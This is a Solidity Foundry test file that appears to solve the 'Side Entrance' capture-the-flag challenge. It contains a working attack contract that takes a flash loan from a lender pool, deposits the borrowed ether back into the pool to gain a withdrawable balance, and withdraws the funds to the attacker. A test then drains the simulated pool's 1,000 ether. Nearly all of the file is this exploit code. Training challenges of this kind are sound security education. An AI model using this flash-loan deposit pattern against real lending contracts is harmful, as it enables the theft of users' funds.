// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract FlashLoanEtherReceiver {
    address payable internal immutable owner;
    address internal immutable lenderPoolAddress;

    constructor(address payable owner_, address lenderPoolAddress_) {
        owner = owner_;
        lenderPoolAddress = lenderPoolAddress_;
    }

    modifier isLenderPool() {
        require(msg.sender == lenderPoolAddress, "Must be lender pool");
        _;
    }

    function execute() external payable isLenderPool {
        // Deposit the amount from the flash loan into the lender pool.
        // Then this smart contract will be entitled to withdraw `msg.value`
        // amount of ether.
        ISideEntranceLenderPool(lenderPoolAddress).deposit{value: msg.value}();
    }

    modifier isOwner() {
        require(msg.sender == owner, "Must be owner");
        _;
    }

    function exploit(uint256 amount_) public isOwner {
        // 1. Create a flashloan, which will also invoke our `execute()` function
        ISideEntranceLenderPool(lenderPoolAddress).flashLoan(amount_);

        // 2. Withdraw all of the ether. Once it arrives at this address, it will be routed home.
        ISideEntranceLenderPool(lenderPoolAddress).withdraw();
    }

    receive() external payable {
        require(owner.send(address(this).balance), "Failed to send ether.");
    }
}

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // Create the contract
        vm.startPrank(attacker);
        FlashLoanEtherReceiver exploitContract = new FlashLoanEtherReceiver(
            attacker,
            address(sideEntranceLenderPool)
        );
        console.log("Created!");
        vm.stopPrank();

        // Run the exploit
        vm.startPrank(attacker);
        exploitContract.exploit(ETHER_IN_POOL);
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}
